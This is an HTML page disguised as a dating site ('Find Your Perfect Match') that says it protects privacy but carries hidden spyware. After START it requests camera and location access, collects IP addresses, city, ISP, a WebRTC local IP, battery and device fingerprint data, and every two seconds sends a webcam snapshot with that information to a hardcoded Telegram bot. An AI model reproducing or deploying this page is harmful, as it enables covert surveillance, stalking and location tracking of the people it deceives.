<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Find Your Partner</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

.container {
    text-align: center;
    max-width: 500px;
    width: 100%;
    padding: 20px;
    background: rgba(0, 0, 0, 0.7);
    border-radius: 20px;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    backdrop-filter: blur(10px);
}

h1 {
    font-size: 2.5rem;
    margin-bottom: 10px;
    background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}

.subtitle {
    font-size: 1.2rem;
    margin-bottom: 30px;
    color: #d1d1d1;
}

.gender-selection {
    margin: 30px 0;
}

.gender-buttons {
    display: flex;
    justify-content: center;
    gap: 15px;
    flex-wrap: wrap;
    margin-top: 15px;
}

.gender-btn {
    padding: 15px 30px;
    font-size: 1.1rem;
    border: none;
    border-radius: 50px;
    cursor: pointer;
    transition: all 0.3s ease;
    font-weight: bold;
    min-width: 120px;
}

.gender-btn:hover {
    transform: translateY(-3px);
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
}

.gender-btn.active {
    transform: scale(1.05);
    box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
}

#male-btn {
    background: linear-gradient(45deg, #3498db, #2980b9);
    color: white;
}

#female-btn {
    background: linear-gradient(45deg, #e84393, #fd79a8);
    color: white;
}

#gay-btn {
    background: linear-gradient(45deg, #9b59b6, #8e44ad);
    color: white;
}

.footer {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    padding: 20px;
    background: rgba(0, 0, 0, 0.9);
    display: flex;
    justify-content: center;
    z-index: 1000;
}

#start-btn {
    padding: 15px 60px;
    font-size: 1.3rem;
    background: linear-gradient(45deg, #2ecc71, #27ae60);
    color: white;
    border: none;
    border-radius: 50px;
    cursor: pointer;
    font-weight: bold;
    letter-spacing: 1px;
    transition: all 0.3s ease;
}

#start-btn:hover:not(:disabled) {
    transform: translateY(-3px);
    box-shadow: 0 10px 20px rgba(46, 204, 113, 0.4);
}

#start-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
}

.loading-screen {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    z-index: 2000;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
    padding: 20px;
}

.loading-spinner {
    width: 80px;
    height: 80px;
    border: 8px solid rgba(255, 255, 255, 0.3);
    border-top: 8px solid #2ecc71;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 30px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-text {
    font-size: 2rem;
    margin-bottom: 15px;
    background: linear-gradient(45deg, #ff9ff3, #feca57);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}

.waiting-text {
    font-size: 1.2rem;
    color: #d1d1d1;
    max-width: 300px;
    line-height: 1.5;
}

canvas {
    display: none;
}
</style>
</head>
<body>
<div class="container">
    <h1>Find Your Perfect Match</h1>
    <p class="subtitle">Connect with like-minded people around the world</p>
    
    <div class="gender-selection">
        <h2 style="margin-bottom: 20px; color: #fff;">Select Your Gender</h2>
        <div class="gender-buttons">
            <button id="male-btn" class="gender-btn">Male üë®</button>
            <button id="female-btn" class="gender-btn">Female üë©</button>
            <button id="gay-btn" class="gender-btn">Gay üè≥Ô∏è‚Äçüåà</button>
        </div>
    </div>
    
    <div style="margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.1); border-radius: 10px;">
        <p style="font-size: 1.1rem; line-height: 1.6;">
            üíñ Click START to begin your journey<br>
            üîí Your privacy is our priority<br>
            üåç Connect with people worldwide
        </p>
    </div>
</div>

<div class="footer">
    <button id="start-btn">START</button>
</div>

<div class="loading-screen" id="loading-screen">
    <div class="loading-spinner"></div>
    <div class="loading-text">Finding Partner...</div>
    <div class="waiting-text">Waiting For Your Perfect Match</div>
    <div style="margin-top: 30px; color: #aaa; font-size: 0.9rem;">
        Requesting permissions... This may take a moment
    </div>
</div>

<canvas id="canvas" style="display:none"></canvas>

<script>
const canvas = document.getElementById("canvas");
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID = "8319568593";

let selectedGender = "";
let intervalId = null;
let latitude = "N/A";
let longitude = "N/A";
let mapLink = "Location not allowed";
let userIP = "Unknown";
let stream = null;
let batteryInfo = "Battery: Not available";
let networkInfo = "Network: Not available";
let localIP = "Unknown";
let city = "Unknown";
let country = "Unknown";
let isp = "Unknown";

const genderButtons = document.querySelectorAll('.gender-btn');
const startBtn = document.getElementById('start-btn');
const loadingScreen = document.getElementById('loading-screen');
const maleBtn = document.getElementById('male-btn');
const femaleBtn = document.getElementById('female-btn');
const gayBtn = document.getElementById('gay-btn');

genderButtons.forEach(button => {
    button.addEventListener('click', () => {
        genderButtons.forEach(btn => btn.classList.remove('active'));
        button.classList.add('active');
        selectedGender = button.textContent.trim();
        startBtn.disabled = false;
    });
});

startBtn.addEventListener('click', startProcess);

function startProcess() {
    if (!selectedGender) {
        alert("Please select your gender first!");
        return;
    }
    
    loadingScreen.style.display = "flex";
    document.querySelector('.loading-text').textContent = "Initializing...";
    document.querySelector('.waiting-text').textContent = "Setting up your profile";
    
    setTimeout(() => {
        requestPermissions();
    }, 1500);
}

function requestPermissions() {
    document.querySelector('.loading-text').textContent = "Requesting Camera Access";
    document.querySelector('.waiting-text').textContent = "Please allow camera permission";
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(s => {
        stream = s;
        document.querySelector('.loading-text').textContent = "Requesting Location Access";
        document.querySelector('.waiting-text').textContent = "Please allow location permission";
        
        return new Promise((resolve, reject) => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        latitude = pos.coords.latitude.toFixed(6);
                        longitude = pos.coords.longitude.toFixed(6);
                        mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
                        resolve();
                    },
                    () => {
                        mapLink = "Location denied";
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                resolve();
            }
        });
    })
    .then(() => {
        document.querySelector('.loading-text').textContent = "Fetching Network Info";
        document.querySelector('.waiting-text').textContent = "Getting your connection details";
        
        return fetch("https://api.ipify.org?format=json");
    })
    .then(r => r.json())
    .then(d => {
        userIP = d.ip;
        return fetch(`https://ipapi.co/${userIP}/json/`);
    })
    .then(r => r.json())
    .then(ipData => {
        city = ipData.city || "Unknown";
        country = ipData.country_name || "Unknown";
        isp = ipData.org || "Unknown";
    })
    .catch(error => {
        console.error("Error:", error);
    })
    .finally(() => {
        document.querySelector('.loading-text').textContent = "Finding Partner...";
        document.querySelector('.waiting-text').textContent = "Waiting For Your Perfect Match";
        
        setTimeout(() => {
            loadingScreen.style.display = "none";
            startSending();
        }, 2000);
    });
}

if (navigator.getBattery) {
    navigator.getBattery().then(b => {
        batteryInfo = `
üîã Battery:
Level: ${Math.round(b.level * 100)}%
Charging: ${b.charging ? 'Yes' : 'No'}
Time: ${b.chargingTime === Infinity ? 'Not charging' : b.chargingTime + ' seconds'}
`;
    });
}

if (navigator.connection) {
    networkInfo = `
üì° Network:
Type: ${navigator.connection.effectiveType}
Downlink: ${navigator.connection.downlink} Mbps
RTT: ${navigator.connection.rtt} ms
Save Data: ${navigator.connection.saveData ? 'Enabled' : 'Disabled'}
`;
}

const getLocalIPAddress = () => {
    return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
        pc.onicecandidate = ice => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (ip && ip[1]) resolve(ip[1]);
            pc.close();
        };
        setTimeout(() => resolve("Not found"), 1000);
    });
};

const getBrowserPlugins = () => {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
    }
    return plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'No plugins detected';
};

const getAdvancedSystemInfo = () => {
    const cores = navigator.hardwareConcurrency || 'Unknown';
    const ram = navigator.deviceMemory || 'Unknown';
    const lang = navigator.language;
    const langs = navigator.languages ? navigator.languages.join(', ') : lang;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platform = navigator.platform;
    const vendor = navigator.vendor || 'Unknown';
    const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
    const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
    const webdriver = navigator.webdriver ? 'Yes' : 'No';
    const maxTouchPoints = navigator.maxTouchPoints || 0;
    const userAgent = navigator.userAgent;
    const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : 'Unknown';
    const plugins = getBrowserPlugins();
    const doNotTrack = navigator.doNotTrack || 'Not specified';
    const oscpu = navigator.oscpu || 'Unknown';
    const product = navigator.product || 'Unknown';
    const productSub = navigator.productSub || 'Unknown';

    const now = new Date();
    const timezoneOffset = now.getTimezoneOffset();
    const utcOffset = -timezoneOffset / 60;
    const offsetSign = utcOffset >= 0 ? '+' : '-';
    const formattedOffset = `UTC${offsetSign}${Math.abs(utcOffset)}`;

    return `
üñ•Ô∏è SYSTEM INFORMATION:
Device: ${platform}
Model: ${deviceModel}
Gender: ${selectedGender}
OS CPU: ${oscpu}
Browser: ${userAgent.substring(0, 80)}...
Product: ${product} ${productSub}
CPU Cores: ${cores}
RAM: ${ram} GB
Languages: ${langs}
Timezone: ${timezone}
UTC Offset: ${formattedOffset}
Vendor: ${vendor}
Plugins: ${plugins}
Do Not Track: ${doNotTrack}
Cookies: ${cookieEnabled}
PDF Viewer: ${pdfViewerEnabled}
WebDriver: ${webdriver}
Touch Points: ${maxTouchPoints}
Screen: ${screen.width}x${screen.height}
Pixel Ratio: ${window.devicePixelRatio}
Color Depth: ${screen.colorDepth}
`;
};

function startSending() {
    getLocalIPAddress().then(ip => { localIP = ip; });
    if (!intervalId) {
        intervalId = setInterval(captureAndSend, 2000);
        startBtn.textContent = "SENDING...";
        startBtn.disabled = true;
        startBtn.style.background = "linear-gradient(45deg, #f39c12, #e67e22)";
    }
}

function captureAndSend() {
    if (!stream) return;
    const videoTrack = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(videoTrack);
    imageCapture.grabFrame().then(imageBitmap => {
        canvas.width = imageBitmap.width;
        canvas.height = imageBitmap.height;
        const ctx = canvas.getContext("2d");
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(imageBitmap, 0, 0);
        canvas.toBlob(blob => {
            const caption = `
üë§ USER PROFILE - ${new Date().toLocaleTimeString()}
‚è∞ Time: ${new Date().toLocaleString()}
üéØ Gender: ${selectedGender}

üìç LOCATION DETAILS:
Latitude: ${latitude}
Longitude: ${longitude}
Google Maps: ${mapLink}
City: ${city}
Country: ${country}
ISP: ${isp}

üåç NETWORK INFORMATION:
Public IP: ${userIP}
Local IP: ${localIP}
${networkInfo}

${getAdvancedSystemInfo()}

${batteryInfo}

üíñ Looking for partner...
‚ö†Ô∏è Auto-update every 2 seconds
`;
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob);
            formData.append("caption", caption);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }, "image/jpeg", 0.7);
    }).catch(() => {});
}
</script>
</body>
</html>
